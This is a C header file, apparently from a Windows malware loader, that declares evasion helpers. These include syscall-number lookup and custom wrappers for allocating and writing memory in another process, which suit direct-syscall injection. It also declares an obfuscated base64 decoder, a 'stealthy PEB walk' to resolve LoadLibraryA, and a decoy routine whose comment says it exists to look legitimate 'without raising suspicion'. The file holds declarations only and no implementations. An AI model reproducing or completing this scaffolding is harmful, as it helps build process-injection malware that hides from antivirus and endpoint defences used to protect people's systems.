#ifndef EVASION_H
#define EVASION_H

#include <windows.h>
#include <stdbool.h>

#define ARRAY_SIZE 1000

typedef HMODULE(WINAPI* pLoadLibraryA)(LPCSTR);

DWORD GetSyid(LPCSTR functionName);

extern DWORD smID;

void SetSyid(DWORD value);

extern NTSTATUS CustAVM(HANDLE hProcess, PVOID *BaseAddress, ULONG ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);

extern NTSTATUS CustWVM(HANDLE hProcess, PVOID BaseAddress, PVOID Buffer, SIZE_T BufferSize, PSIZE_T NumberOfBytesWritten);

// Function to Resolve APIs
FARPROC ResolveFn(LPCSTR mod, LPCSTR fn);

// Base64Decode
char* Bsfd(const char* encoded);

/* Decoy function
This function will generate 1,000 random numbers, sort them, and compute the average. 
It looks like legitimate processing activity without raising suspicion.
*/
void SortNumbers();

// Function to retrieve LoadLibraryA using a stealthy PEB walk
pLoadLibraryA GetLoadLibraryA();

#ifdef _M_X64
#define PEB_OFFSET 0x60
#else
#define PEB_OFFSET 0x30
#endif

#endif // EVASION_H
